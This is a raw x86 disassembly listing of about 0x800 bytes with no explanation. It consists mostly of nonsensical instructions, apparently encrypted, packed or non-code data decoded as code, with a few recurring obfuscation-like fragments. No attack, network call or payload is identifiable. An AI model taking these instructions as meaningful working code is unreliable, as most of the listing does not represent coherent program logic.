  40194f:	dec    esp
  401950:	loopne 0x4018fd
  401952:	xor    DWORD PTR [esi+ebx*2-0x7d],0xffffff83
  401957:	out    0x40,al
  401959:	shl    ebp,1
  40195b:	xchg   BYTE PTR [eax],dh
  40195d:	rcl    DWORD PTR [edi],1
  40195f:	(bad)  
  401960:	sar    DWORD PTR [ecx+0x32],cl
  401963:	shr    BYTE PTR [eax-0x60],1
  401966:	mov    ebp,0x694c729d
  40196b:	push   cs
  40196c:	jge    0x401958
  40196e:	leave  
  40196f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401970:	aam    0x90
  401972:	push   edx
  401973:	and    edx,DWORD PTR [ebx]
  401975:	jp     0x401999
  401977:	ds xor esp,ecx
  40197a:	lea    esp,[ebx]
  40197c:	lea    esi,es:[ebp-0x5825eed1]
  401983:	sbb    eax,DWORD PTR [ebx-0x2c]
  401986:	pushf  
  401987:	sub    ecx,DWORD PTR [edi+ecx*4-0x16ffdf97]
  40198e:	add    ecx,eax
  401990:	outs   dx,DWORD PTR ds:[esi]
  401991:	ins    DWORD PTR es:[edi],dx
  401992:	pop    ebp
  401993:	dec    edi
  401994:	xlat   BYTE PTR ds:[ebx]
  401995:	fbstp  TBYTE PTR [edi-0x6ead249a]
  40199b:	into   
  40199c:	(bad)  
  40199d:	mov    eax,ds:0x71d32c9a
  4019a2:	dec    eax
  4019a3:	jg     0x401946
  4019a5:	pushf  
  4019a6:	xchg   esi,eax
  4019a7:	or     bh,BYTE PTR [edx]
  4019a9:	xchg   ebp,eax
  4019aa:	xor    al,0x6a
  4019ac:	imul   ebp,DWORD PTR [ebx-0x45],0xffffffe2
  4019b0:	sbb    BYTE PTR [ecx],al
  4019b2:	mov    ch,0x29
  4019b4:	hlt    
  4019b5:	dec    eax
  4019b6:	scas   eax,DWORD PTR es:[edi]
  4019b7:	mov    ebp,0xa7ec9b14
  4019bc:	outs   dx,BYTE PTR ds:[esi]
  4019bd:	ins    DWORD PTR es:[edi],dx
  4019be:	fld    TBYTE PTR cs:[ebx+eiz*2]
  4019c2:	xor    eax,0x4c2c260c
  4019c7:	and    eax,0xb8f9acf
  4019cc:	jge    0x401978
  4019ce:	mov    cl,0x4c
  4019d0:	sti    
  4019d1:	in     al,dx
  4019d2:	adc    eax,0xfe2b84ac
  4019d7:	out    0x34,eax
  4019d9:	xchg   ecx,eax
  4019da:	in     al,0x95
  4019dc:	(bad)  [esi]
  4019de:	add    DWORD PTR [esi],esp
  4019e0:	cmp    al,0x9f
  4019e2:	jb     0x401a1d
  4019e4:	inc    ecx
  4019e5:	mov    BYTE PTR [esi+0x69a2ae09],dl
  4019eb:	aad    0xc8
  4019ed:	xchg   edx,eax
  4019ee:	inc    eax
  4019ef:	push   0x8ce28b41
  4019f4:	or     cl,bh
  4019f6:	lahf   
  4019f7:	cmp    BYTE PTR [edx+0x4b],cl
  4019fa:	lea    edx,[eax]
  4019fc:	sub    DWORD PTR [edi],edx
  4019fe:	dec    ecx
  4019ff:	sbb    DWORD PTR [ecx],ebx
  401a01:	call   FWORD PTR [ecx+edx*2-0x38ea54f5]
  401a08:	add    al,BYTE PTR ds:0x2685c01
  401a0e:	mov    ebx,0xfb2bd9d1
  401a13:	or     dl,BYTE PTR [edx+ecx*1-0xdd23f2a]
  401a1a:	push   0xfffffff8
  401a1c:	pop    es
  401a1d:	sub    bl,BYTE PTR [eax]
  401a1f:	lea    edi,[edx]
  401a21:	mov    al,ds:0x2fdf0bc9
  401a26:	mov    ebp,ebx
  401a28:	jmp    0x6bf796
  401a2d:	gs es sbb eax,0x8874b932
  401a34:	or     bh,al
  401a36:	outs   dx,DWORD PTR ds:[esi]
  401a37:	or     eax,DWORD PTR [eax]
  401a39:	mov    edx,0x7011f4db
  401a3e:	jno    0x4019fe
  401a40:	int    0x7f
  401a42:	addr16 mov eax,0xec7816b5
  401a48:	inc    esi
  401a49:	icebp  
  401a4a:	fimul  DWORD PTR [edx]
  401a4c:	cs or  al,0x6f
  401a4f:	out    0x3e,al
  401a51:	lds    esp,FWORD PTR [edi+eax*2-0x7d65646f]
  401a58:	ror    DWORD PTR [ebp+esi*1-0xaccb13b],1
  401a5f:	mov    eax,0xe2bc82e2
  401a64:	pop    ss
  401a65:	in     eax,0xfb
  401a67:	stos   DWORD PTR es:[edi],eax
  401a68:	or     BYTE PTR [eax+0x7],dh
  401a6b:	popf   
  401a6c:	sub    DWORD PTR es:[ebx],eax
  401a6f:	ss gs in al,0x28
  401a73:	mov    esp,0x89dc5f7b
  401a78:	pop    ebp
  401a79:	mov    al,0xe9
  401a7b:	pushf  
  401a7c:	add    DWORD PTR [eax],eax
  401a7e:	add    BYTE PTR [ecx-0x4c264c60],dl
  401a84:	jmp    0x10588ada
  401a89:	push   ds
  401a8a:	dec    esp
  401a8b:	inc    ebx
  401a8c:	out    dx,al
  401a8d:	pop    ss
  401a8e:	loope  0x401a9e
  401a90:	js     0x401b10
  401a92:	jle    0x401a8e
  401a94:	jg     0x401b14
  401a96:	jle    0x401ab5
  401a98:	xor    eax,0xcfb475d1
  401a9d:	das    
  401a9e:	cmc    
  401a9f:	cli    
  401aa0:	cmp    esp,DWORD PTR [esi+0x4a]
  401aa3:	mov    ?,WORD PTR [edi+0x1a31d372]
  401aa9:	sub    ebx,esi
  401aab:	fsubp  st(7),st
  401aad:	cmpxchg BYTE PTR [ecx-0x13c8eef9],bl
  401ab4:	fstp   QWORD PTR [edx-0x6ea21343]
  401aba:	jb     0x9541430e
  401ac0:	inc    ebp
  401ac1:	int3   
  401ac2:	pop    esi
  401ac3:	aad    0xb9
  401ac5:	aam    0xbf
  401ac7:	and    ah,BYTE PTR es:[ebx-0x7faeb5dc]
  401ace:	and    edx,ecx
  401ad0:	mov    eax,ds:0x1bd00941
  401ad5:	dec    esi
  401ad6:	sub    edx,esi
  401ad8:	adc    BYTE PTR [ebx+0x2a64f982],ch
  401ade:	push   esi
  401adf:	pop    ds
  401ae0:	add    DWORD PTR [eax+eiz*1-0x39],0x65
  401ae5:	fiadd  DWORD PTR [ebp+0x647b0980]
  401aeb:	mov    esp,0x1e30ce16
  401af0:	fnstsw WORD PTR [ebp-0x66d9dc09]
  401af6:	sub    BYTE PTR [esi],cl
  401af8:	push   cs
  401af9:	add    al,0xa6
  401afb:	ins    BYTE PTR es:[edi],dx
  401afc:	sub    eax,0x848a5e95
  401b01:	xor    al,0x10
  401b03:	add    DWORD PTR [edi+0x3e],ebx
  401b06:	rol    BYTE PTR [ebx+0x16],0x89
  401b0a:	lds    esp,FWORD PTR [ebx]
  401b0c:	loope  0x401aca
  401b0e:	stos   DWORD PTR es:[edi],eax
  401b0f:	mov    ecx,0xc32abccf
  401b14:	xchg   esp,eax
  401b15:	lds    eax,FWORD PTR [edx-0x2d]
  401b18:	test   eax,0x757ab188
  401b1d:	xlat   BYTE PTR ds:[ebx]
  401b1e:	(bad)  
  401b1f:	(bad)  [esi-0x1c]
  401b22:	and    DWORD PTR ds:0x8b6c8983,edi
  401b28:	xchg   esp,eax
  401b29:	mov    eax,0x8bb93a25
  401b2e:	or     al,0x67
  401b30:	popf   
  401b31:	pop    ds
  401b32:	xchg   bh,dl
  401b34:	sub    DWORD PTR [ebp+0x3068cac],esi
  401b3a:	shl    DWORD PTR [ebx-0x728a1bfd],cl
  401b40:	imul   dl
  401b42:	mov    al,0x6d
  401b44:	pop    ebx
  401b45:	jmp    0xbbeb:0x513963b9
  401b4c:	adc    al,0xcb
  401b4e:	pop    esi
  401b4f:	jge    0x401bcd
  401b51:	call   0x9199:0xdcd0c483
  401b58:	data16 jp 0x401bae
  401b5b:	fcom   QWORD PTR [eax+0x38]
  401b5e:	in     al,dx
  401b5f:	jns    0x401bcf
  401b61:	inc    ebp
  401b62:	adc    eax,DWORD PTR [esi]
  401b64:	and    BYTE PTR [eax+0x1d],dl
  401b67:	or     cl,BYTE PTR [ecx]
  401b69:	mov    cl,0xab
  401b6b:	jb     0x401b50
  401b6d:	xor    bh,ch
  401b6f:	mov    dl,0x56
  401b71:	les    esp,FWORD PTR [eax]
  401b73:	add    eax,0x6df9368e
  401b78:	mov    cl,cl
  401b7a:	inc    esi
  401b7b:	fdivr  DWORD PTR [edx-0x1]
  401b7e:	jl     0x401bc2
  401b80:	push   ss
  401b81:	leave  
  401b82:	adc    al,0x53
  401b84:	enter  0xc47d,0x76
  401b88:	mov    ebx,0x5b6a5c62
  401b8d:	push   eax
  401b8e:	jo     0x401b66
  401b90:	std    
  401b91:	xchg   BYTE PTR ds:0x5213c6db,ch
  401b97:	adc    bh,ah
  401b99:	or     DWORD PTR [edi-0x5c0551c4],edi
  401b9f:	dec    edi
  401ba0:	or     dh,BYTE PTR [edi-0x785fd17c]
  401ba6:	stos   DWORD PTR es:[edi],eax
  401ba7:	retf   0xa8f0
  401baa:	test   DWORD PTR [ebp-0x14a6156c],0x32d965ad
  401bb4:	dec    esp
  401bb5:	loope  0x401bad
  401bb7:	add    eax,0x8336356a
  401bbc:	call   0xd4cd:0x41f5c782
  401bc3:	lahf   
  401bc4:	add    cl,dl
  401bc6:	les    edx,FWORD PTR [edx]
  401bc8:	xchg   edx,eax
  401bc9:	inc    ebx
  401bca:	xabort 0xc4
  401bcd:	mov    ch,0x5c
  401bcf:	pop    esp
  401bd0:	fistp  DWORD PTR [ecx-0x4177197b]
  401bd6:	push   ds
  401bd7:	pop    ebp
  401bd8:	out    0x3b,eax
  401bda:	mov    al,0xd5
  401bdc:	sbb    edx,ecx
  401bde:	push   ds
  401bdf:	sub    bl,BYTE PTR [eax-0x7a]
  401be2:	mov    esi,0x4765184f
  401be7:	(bad)  
  401be8:	mov    edi,0x93194485
  401bed:	sar    BYTE PTR [edi-0x34],cl
  401bf0:	inc    edx
  401bf1:	push   ds
  401bf2:	mov    al,ds:0x2b60d9d8
  401bf7:	ror    DWORD PTR [ebp-0x7c22f568],0x47
  401bfe:	mov    esp,0xc6e290
  401c03:	and    ebx,DWORD PTR [esi]
  401c05:	adc    DWORD PTR [esi-0x29],0x24
  401c09:	mov    esp,0xf42ea422
  401c0e:	lods   eax,DWORD PTR ds:[esi]
  401c0f:	iret   
  401c10:	retf   
  401c11:	dec    edi
  401c12:	and    BYTE PTR [eax-0x5f],dl
  401c15:	inc    ecx
  401c16:	mov    BYTE PTR [ebx-0x74a924bd],bh
  401c1c:	inc    ebp
  401c1d:	mov    al,0x8b
  401c1f:	dec    ebp
  401c20:	clc    
  401c21:	xor    eax,esi
  401c23:	add    eax,edi
  401c25:	mov    DWORD PTR [ecx],eax
  401c27:	mov    eax,DWORD PTR [ebp-0x24]
  401c2a:	mov    ecx,DWORD PTR [ebp-0x8]
  401c2d:	xor    eax,esi
  401c2f:	jmp    0x401dd0
  401c34:	pop    ss
  401c35:	xor    eax,DWORD PTR [ebx]
  401c37:	mov    dl,0x23
  401c39:	mov    dl,0xb7
  401c3b:	mov    bl,0xfb
  401c3d:	lahf   
  401c3e:	cmc    
  401c3f:	xchg   esp,eax
  401c40:	je     0x401c41
  401c42:	sub    eax,0x7e798a53
  401c47:	jle    0x401c43
  401c49:	jg     0x401cc9
  401c4b:	jle    0x401c1a
  401c4d:	retf   
  401c4e:	test   BYTE PTR [esi-0x7c025e8],ch
  401c54:	sbb    DWORD PTR [eax+0x3],esp
  401c57:	adc    dl,0x17
  401c5a:	imul   edx,DWORD PTR [ebx-0x47e729b3],0x8df79f16
  401c64:	ja     0x401bea
  401c66:	dec    esp
  401c67:	scas   al,BYTE PTR es:[edi]
  401c68:	jns    0x401c07
  401c6a:	jmp    0x7f1faa89
  401c6f:	inc    ecx
  401c70:	into   
  401c71:	inc    ecx
  401c72:	cmp    ecx,DWORD PTR [eax+0x13d4a29c]
  401c78:	out    dx,al
  401c79:	out    0xfa,al
  401c7b:	push   esp
  401c7c:	out    0x5f,eax
  401c7e:	cmp    al,BYTE PTR [ebp+0x22]
  401c81:	cmp    DWORD PTR [esi+0x30978b31],ecx
  401c87:	push   esi
  401c88:	jp     0x401c8d
  401c8a:	out    dx,eax
  401c8b:	sub    eax,0x817143fb
  401c90:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401c91:	mov    ch,0x11
  401c93:	call   0x74592543
  401c98:	test   BYTE PTR [eax+0x3a],cl
  401c9b:	xor    al,0xe1
  401c9d:	call   0xb158:0x4d458556
  401ca4:	and    DWORD PTR [ebx],eax
  401ca6:	adc    eax,0xe7775149
  401cab:	xchg   ebx,eax
  401cac:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  401cae:	fild   WORD PTR ds:0xe84f854f
  401cb4:	sti    
  401cb5:	cmp    bl,BYTE PTR [eax+0x1b1154e1]
  401cbb:	mov    WORD PTR [ecx-0x52],?
  401cbe:	fisttp DWORD PTR [edi]
  401cc0:	(bad)  
  401cc1:	jge    0x401d02
  401cc3:	(bad)  
  401cc4:	hlt    
  401cc5:	dec    ecx
  401cc6:	scas   al,BYTE PTR es:[edi]
  401cc7:	pop    es
  401cc8:	or     BYTE PTR [edx],0x88
  401ccb:	jle    0x401d1b
  401ccd:	lea    edi,ds:0x2b1238bf
  401cd3:	into   
  401cd4:	sub    DWORD PTR [edi+0x9],ebp
  401cd7:	or     bh,cl
  401cd9:	xchg   edx,eax
  401cda:	ret    0x506
  401cdd:	push   eax
  401cde:	scas   al,BYTE PTR es:[edi]
  401cdf:	cwde   
  401ce0:	jle    0x401d44
  401ce2:	fs push 0xbf8b26b6
  401ce8:	mov    esi,0x1c70e4c2
  401ced:	or     BYTE PTR [ecx],al
  401cef:	retf   
  401cf0:	mov    edi,0xe2211e29
  401cf5:	fld    QWORD PTR [esi+0x6427750f]
  401cfb:	shr    dl,0xc5
  401cfe:	adc    BYTE PTR ds:0xc8e57359,ah
  401d04:	dec    edx
  401d05:	add    bl,ch
  401d07:	mov    DWORD PTR [edi],edx
  401d09:	xchg   ebx,eax
  401d0a:	stos   BYTE PTR es:[edi],al
  401d0b:	jae    0x401c9f
  401d0d:	mov    esp,0x5cf8aacf
  401d12:	sbb    DWORD PTR [ebp+0x25],ecx
  401d15:	mov    dl,0x96
  401d17:	sar    BYTE PTR [ebp+0x11],cl
  401d1a:	or     DWORD PTR [edx],ecx
  401d1c:	dec    edx
  401d1d:	ins    DWORD PTR es:[edi],dx
  401d1e:	aad    0x55
  401d20:	pushf  
  401d21:	fwait
  401d22:	sub    BYTE PTR [edx+0x1854e5d5],0xd
  401d29:	(bad)  
  401d2b:	cmp    BYTE PTR [ecx-0x6c58d2c1],ch
  401d31:	nop
  401d32:	faddp  st(7),st
  401d34:	jmp    0x401cfe
  401d36:	xchg   esp,eax
  401d37:	mov    fs,WORD PTR [ebx-0x24765e52]
  401d3d:	(bad)  
  401d3e:	jmp    0x4d15:0xb2745cf9
  401d45:	cmp    ah,0x5a
  401d48:	mov    ds:0xcbe3de27,eax
  401d4d:	(bad)  
  401d4e:	dec    edx
  401d4f:	test   al,0xae
  401d51:	jg     0x401d2b
  401d53:	inc    esi
  401d54:	std    
  401d55:	out    dx,eax
  401d56:	call   0xcd98:0xc99101c5
  401d5d:	cmc    
  401d5e:	repz imul ebp,DWORD PTR [esi+0x6fab868e],0xed81467
  401d69:	add    cl,BYTE PTR [ecx-0x1bdc4f92]
  401d6f:	mov    esp,DWORD PTR [esi]
  401d71:	test   eax,0x657c9667
  401d76:	stc    
  401d77:	xor    ah,BYTE PTR [edi-0x4a]
  401d7a:	mov    ch,0x32
  401d7c:	lds    ecx,FWORD PTR [ebp-0x5a]
  401d7f:	daa    
  401d80:	mov    bl,0x89
  401d82:	shl    BYTE PTR [ebx],cl
  401d84:	sub    eax,0xd1fac2a7
  401d89:	pop    edx
  401d8a:	sbb    al,0x90
  401d8c:	jbe    0x401d74
  401d8e:	hlt    
  401d8f:	leave  
  401d90:	call   0x7cc1cfaf
  401d95:	int    0xda
  401d97:	cwde   
  401d98:	push   eax
  401d99:	(bad)  
  401d9a:	stos   BYTE PTR es:[edi],al
  401d9b:	call   0xa6f4f685
  401da0:	aaa    
  401da1:	mov    eax,edi
  401da3:	jp     0x401dcd
  401da5:	jb     0x401da1
  401da7:	in     al,0xee
  401da9:	add    bh,bh
  401dab:	jl     0x401d8f
  401dad:	jmp    0x9e7955e0
  401db2:	nop
  401db3:	cmp    BYTE PTR [ebp-0x7fe073b5],0xdf
  401dba:	or     dl,BYTE PTR [edi]
  401dbc:	arpl   di,ax
  401dbe:	imul   edx,DWORD PTR [edx+0x2c],0x97f85420
  401dc5:	rcr    BYTE PTR [ebx+0x41],1
  401dc8:	pop    es
  401dc9:	sub    ch,BYTE PTR [ecx-0x31152b3b]
  401dcf:	gs add eax,edi
  401dd2:	mov    DWORD PTR [ecx+0x4],eax
  401dd5:	mov    eax,DWORD PTR [ebp-0x2c]
  401dd8:	mov    ecx,DWORD PTR [ebp-0x8]
  401ddb:	mov    DWORD PTR [ecx+0x8],eax
  401dde:	mov    eax,DWORD PTR [ebp-0x30]
  401de1:	mov    ecx,DWORD PTR [ebp-0x8]
  401de4:	mov    DWORD PTR [ecx+0xc],eax
  401de7:	mov    eax,DWORD PTR [ebp-0x34]
  401dea:	mov    ecx,DWORD PTR [ebp-0x8]
  401ded:	mov    DWORD PTR [ecx+0x10],eax
  401df0:	mov    eax,eax
  401df2:	mov    eax,DWORD PTR [ebp-0x20]
  401df5:	xor    eax,esi
  401df7:	add    eax,edi
  401df9:	jmp    0x401f9a
  401dfe:	mov    ah,0x22
  401e00:	les    eax,FWORD PTR [eax+edx*2]
  401e03:	loopne 0x401e79
  401e05:	mov    dl,0xc7
  401e07:	xor    DWORD PTR [eax-0x633a36c8],ebp
  401e0d:	add    edx,DWORD PTR [esi]
  401e0f:	pop    es
  401e10:	jle    0x401e90
  401e12:	cli    
  401e13:	jg     0x401e93
  401e15:	jle    0x401e67
  401e17:	cmp    DWORD PTR [esi+0x37],edx
  401e1a:	adc    BYTE PTR [ebx-0x13320c40],ch
  401e20:	push   edx
  401e21:	enter  0x9e5,0xf1
  401e25:	xchg   ebx,eax
  401e26:	jecxz  0x401e87
  401e28:	jl     0x401dd4
  401e2a:	dec    ebx
  401e2b:	das    
  401e2c:	repz add BYTE PTR [esi+0x2388e972],ch
  401e33:	mov    cl,0x68
  401e35:	jl     0x401eac
  401e37:	push   ds
  401e38:	rsqrtps xmm2,XMMWORD PTR [ecx+0x48a956c8]
  401e3f:	inc    esi
  401e40:	adc    DWORD PTR [edx+ecx*8+0x10e39385],0xffffffc0
  401e48:	sbb    edx,ebx
  401e4a:	test   eax,0xa4ca16a5
  401e4f:	jmp    0x401e55
  401e51:	sub    dl,cl
  401e53:	addr16 enter 0xe57a,0x43
  401e58:	ret    
  401e59:	scas   eax,DWORD PTR es:[edi]
  401e5a:	mov    edx,0x8431f217
  401e5f:	and    BYTE PTR [ebx],ch
  401e61:	xlat   BYTE PTR ds:[ebx]
  401e62:	cmp    al,0xd8
  401e64:	stos   DWORD PTR es:[edi],eax
  401e65:	enter  0x6f7,0x5a
  401e69:	aas    
  401e6a:	xchg   ecx,eax
  401e6b:	in     eax,0xc3
  401e6d:	mov    ds:0xcce903,eax
  401e72:	call   0x9011c8a7
  401e77:	xor    dl,BYTE PTR [ecx+0x3e]
  401e7a:	adc    ah,BYTE PTR [eax]
  401e7c:	hlt    
  401e7d:	and    BYTE PTR [ecx],ch
  401e7f:	fldenv [edi]
  401e81:	xchg   esi,eax
  401e82:	retf   
  401e83:	push   edi
  401e84:	aaa    
  401e85:	mov    al,ds:0xb2f6cfe8
  401e8a:	sbb    eax,0xf4071ccb
  401e8f:	push   ecx
  401e90:	pop    ds
  401e91:	jmp    DWORD PTR [ebx+0x36e6c157]
  401e97:	adc    eax,0x9648a3fa
  401e9c:	and    ch,0xce
  401e9f:	sbb    eax,ebx
  401ea1:	out    dx,al
  401ea2:	pusha  
  401ea3:	das    
  401ea4:	je     0x401ed1
  401ea6:	test   al,0xc8
  401ea8:	pop    ecx
  401ea9:	push   ecx
  401eaa:	in     al,0x60
  401eac:	or     al,0x66
  401eae:	js     0x401f1d
  401eb0:	dec    edx
  401eb1:	xchg   ebx,eax
  401eb2:	pop    edx
  401eb3:	sub    eax,0xd56c7ad9
  401eb8:	pop    ds
  401eb9:	imul   esp
  401ebb:	sti    
  401ebc:	adc    al,0xb3
  401ebe:	rol    DWORD PTR [esi-0x5c],0x93
  401ec2:	jle    0x401ef8
  401ec4:	jo     0x401e6a
  401ec6:	jp     0x401e86
  401ec8:	shl    BYTE PTR [edx],1
  401eca:	dec    edx
  401ecb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401ecc:	pop    ebx
  401ecd:	inc    edi
  401ece:	push   esp
  401ecf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401ed0:	rcl    DWORD PTR [edx-0x2a],1
  401ed3:	jno    0x401f34
  401ed5:	jae    0x401eb2
  401ed7:	(bad)  
  401ed8:	mov    al,ds:0x4890c658
  401edd:	inc    bl
  401edf:	mov    edx,0xe45b4893
  401ee4:	popa   
  401ee5:	mov    eax,DWORD PTR [ebp+edx*8-0x6c8add85]
  401eec:	loopne 0x401edc
  401eee:	mov    al,ds:0xa00ac819
  401ef3:	or     edx,ebx
  401ef5:	adc    BYTE PTR [edi+0x5c],dl
  401ef8:	aaa    
  401ef9:	pop    edx
  401efa:	fwait
  401efb:	xor    DWORD PTR [edx],ecx
  401efd:	inc    edi
  401efe:	pop    ss
  401eff:	ins    BYTE PTR es:[edi],dx
  401f00:	adc    BYTE PTR [esi-0x54],al
  401f03:	addr16 push ecx
  401f05:	inc    esi
  401f06:	sub    DWORD PTR [edi],0x7c
  401f09:	xchg   esi,eax
  401f0a:	xlat   BYTE PTR ds:[ebx]
  401f0b:	add    eax,0x297124fb
  401f10:	push   ecx
  401f11:	push   edx
  401f12:	pusha  
  401f13:	cmc    
  401f14:	into   
  401f15:	es test al,0x53
  401f18:	mov    ch,BYTE PTR [ebx+0x42]
  401f1b:	pop    ss
  401f1c:	imul   ebx,DWORD PTR [ebp+0x7],0x25
  401f20:	in     al,dx
  401f21:	jg     0x401f2f
  401f23:	inc    esp
  401f24:	adc    esi,0x2f
  401f27:	pop    ebx
  401f28:	mov    eax,DWORD PTR [edx-0x40]
  401f2b:	dec    edi
  401f2c:	repnz inc esi
  401f2e:	jnp    0x401f32
  401f30:	std    
  401f31:	inc    esi
  401f32:	mov    al,ds:0x873b224f
  401f37:	jl     0x401f25
  401f39:	jg     0x401ede
  401f3b:	(bad)  
  401f3c:	xchg   esp,eax
  401f3d:	fistp  DWORD PTR [ebx-0x6a]
  401f40:	loop   0x401f09
  401f42:	int3   
  401f43:	mov    eax,ds:0x96b9f55c
  401f48:	adc    eax,0xa36c88f7
  401f4d:	dec    ecx
  401f4e:	js     0x401ed9
  401f50:	add    eax,0x2cc062be
  401f55:	xor    al,0xb6
  401f57:	jbe    0x401f87
  401f59:	repz mov edx,0x49b064d6
  401f5f:	dec    edx
  401f60:	jmp    0xf296ad8f
  401f65:	test   al,0xad
  401f67:	sub    al,0xbb
  401f69:	bound  ecx,QWORD PTR [ebp-0x74]
  401f6c:	pop    esp
  401f6d:	imul   esi,DWORD PTR [ebx-0x3868b7f],0x3b
  401f74:	dec    edi
  401f75:	or     al,0xfe
  401f77:	inc    esi
  401f78:	push   0xfaafb804
  401f7d:	mov    ebx,0xbc4abd5b
  401f82:	lds    ebx,FWORD PTR [esi+0x55]
  401f85:	in     al,dx
  401f86:	cld    
  401f87:	xchg   ebp,eax
  401f88:	ds xchg edx,eax
  401f8a:	neg    dh
  401f8c:	fs data16 lahf 
  401f8f:	imul   ecx,DWORD PTR [ebp+0x7684c306],0xd45cb6c9
  401f99:	cmp    BYTE PTR [edi],cl
  401f9b:	test   BYTE PTR [ebp+0x3],ch
  401f9e:	add    BYTE PTR [eax],al
  401fa0:	lea    eax,[ebp-0x98]
  401fa6:	push   eax
  401fa7:	mov    eax,DWORD PTR [ebp-0x1c]
  401faa:	xor    eax,esi
  401fac:	add    eax,edi
  401fae:	jmp    0x40214f
  401fb3:	pop    ecx
  401fb4:	and    al,0xad
  401fb6:	aas    
  401fb7:	jno    0x402010
  401fb9:	imul   esp,DWORD PTR [eax-0x4769416e],0xaad6a460
  401fc3:	xchg   edx,eax
  401fc4:	add    al,0x7e
  401fc6:	jle    0x401fc2
  401fc8:	jg     0x402048
  401fca:	jle    0x401fba
  401fcc:	push   edx
  401fcd:	arpl   WORD PTR gs:[eax+eiz*2-0x37d64881],dx
  401fd5:	outs   dx,BYTE PTR ds:[esi]
  401fd6:	mov    dl,0x78
  401fd8:	dec    ebp
  401fd9:	cmp    al,0x2b
  401fdb:	lock cmp eax,0x51598866
  401fe1:	lods   al,BYTE PTR ds:[esi]
  401fe2:	retf   
  401fe3:	push   cs
  401fe4:	sbb    BYTE PTR [eax+0x76],0xb9
  401fe8:	clc    
  401fe9:	cli    
  401fea:	sbb    DWORD PTR [ecx],esi
  401fec:	test   DWORD PTR [eax],edx
  401fee:	lods   al,BYTE PTR ds:[esi]
  401fef:	inc    edx
  401ff0:	jbe    0x40206e
  401ff2:	loop   0x401fb2
  401ff4:	cmc    
  401ff5:	dec    edi
  401ff6:	rcr    DWORD PTR [ecx],0x2e
  401ff9:	add    BYTE PTR [ecx-0x198d34a5],bh
  401fff:	mov    ebp,0x7aaaba91
  402004:	inc    edx
  402005:	lahf   
  402006:	test   al,0xc2
  402008:	xor    eax,0xb8c3a8b
  40200d:	mov    ecx,0x15d465a7
  402012:	xor    ch,al
  402014:	ret    
  402015:	ja     0x402066
  402017:	pop    ebx
  402018:	dec    edi
  402019:	add    bh,dh
  40201b:	int    0x32
  40201d:	push   ss
  40201e:	fsubrp st(4),st
  402020:	pop    esi
  402021:	xchg   ebx,eax
  402022:	mov    al,ds:0xc122df80
  402027:	fbld   TBYTE PTR [ecx+ebp*8]
  40202a:	icebp  
  40202b:	xchg   ebp,eax
  40202c:	push   ss
  40202d:	xor    al,0xa4
  40202f:	sbb    BYTE PTR [edx+ebp*1-0x674a5573],dh
  402036:	(bad)  
  402037:	sub    bh,BYTE PTR [edx]
  402039:	mov    cl,0xfb
  40203b:	mov    ebp,0x5c53286e
  402040:	mov    bh,0x0
  402042:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402043:	fucomip st,st(3)
  402045:	sar    DWORD PTR [ebp+0x71],1
  402048:	jne    0x402041
  40204a:	dec    eax
  40204b:	mov    al,BYTE PTR [edi]
  40204d:	in     eax,0xbb
  40204f:	mov    bh,0x92
  402051:	mov    WORD PTR [eax],ss
  402053:	push   ds
  402054:	scas   eax,DWORD PTR es:[edi]
  402055:	xchg   ebp,eax
  402056:	test   DWORD PTR ds:0x11f95b33,ebx
  40205c:	xchg   ebx,eax
  40205d:	addr16 into 
  40205f:	ins    BYTE PTR es:[edi],dx
  402060:	sub    DWORD PTR [ecx-0x2e],ecx
  402063:	cwde   
  402064:	callw  0x541b
  402068:	and    esp,DWORD PTR [edi]
  40206a:	(bad)  
  40206c:	mov    ecx,0x7cbfa3fe
  402071:	pop    edx
  402072:	fcomp  DWORD PTR [ebx-0x29f97b3a]
  402078:	and    DWORD PTR [edx+0x7d4f8c00],edx
  40207e:	pop    ebp
  40207f:	sbb    al,0xc5
  402081:	dec    edx
  402082:	das    
  402083:	and    DWORD PTR [ecx+0x11f1babf],ebp
  402089:	call   0x8f72:0xb2dda799
  402090:	xor    edi,DWORD PTR [ebp+0x1f765b60]
  402096:	jnp    0x402078
  402098:	adc    ebp,ebx
  40209a:	mov    esi,DWORD PTR [edx]
  40209c:	jle    0x402049
  40209e:	pushf  
  40209f:	cmc    
  4020a0:	inc    edx
  4020a1:	dec    ebp
  4020a2:	xchg   edi,eax
  4020a3:	pop    ebx
  4020a4:	inc    ebp
  4020a5:	idiv   BYTE PTR [ebp+ebp*2-0x67]
  4020a9:	mov    dh,0xe6
  4020ab:	out    0x5b,al
  4020ad:	out    0x9d,al
  4020af:	or     al,0xf6
  4020b1:	addr16 in eax,dx
  4020b3:	ins    BYTE PTR es:[edi],dx
  4020b4:	or     DWORD PTR [ebx-0x48a92f62],edx
  4020ba:	mov    eax,0xa43967af
  4020bf:	je     0x402103
  4020c1:	cmc    
  4020c2:	enter  0xc2d2,0x6b
  4020c6:	data16 or BYTE PTR [ecx+eax*4-0x2c6ab2d6],al
  4020ce:	repz adc eax,0x1cd99df2
  4020d4:	push   eax
  4020d5:	push   eax
  4020d6:	dec    esi
  4020d7:	push   esi
  4020d8:	sub    ecx,DWORD PTR [eax]
  4020da:	pop    edi
  4020db:	call   0xc21a:0x3825fcd4
  4020e2:	cdq    
  4020e3:	shl    DWORD PTR [esi],0x81
  4020e6:	(bad)  
  4020e7:	and    dl,dh
  4020e9:	ss jecxz 0x4020b5
  4020ec:	sbb    esi,DWORD PTR [esi]
  4020ee:	ret    
  4020ef:	lock jg 0x40207b
  4020f2:	stc    
  4020f3:	stc    
  4020f4:	and    al,0x83
  4020f6:	dec    ebp
  4020f7:	ficomp WORD PTR [esp+esi*2-0x7]
  4020fb:	sbb    al,BYTE PTR [edi-0x7]
  4020fe:	add    eax,0x3b0bfeb1
  402103:	test   eax,0xe674d0b6
  402108:	cmp    al,0x97
  40210a:	ret    0x3eb
  40210d:	imul   esp,DWORD PTR [eax],0x442074e1
  402113:	in     al,dx
  402114:	in     eax,0x73
  402116:	dec    ecx
  402117:	adc    esp,DWORD PTR [esi]
  402119:	arpl   WORD PTR [eax+0x5c],ax
  40211c:	xchg   ebp,edx
  40211e:	push   ecx
  40211f:	fwait
  402120:	adc    DWORD PTR [esi+0x1d],esi
  402123:	sub    edi,DWORD PTR [edi+ecx*1]
  402126:	pushf  
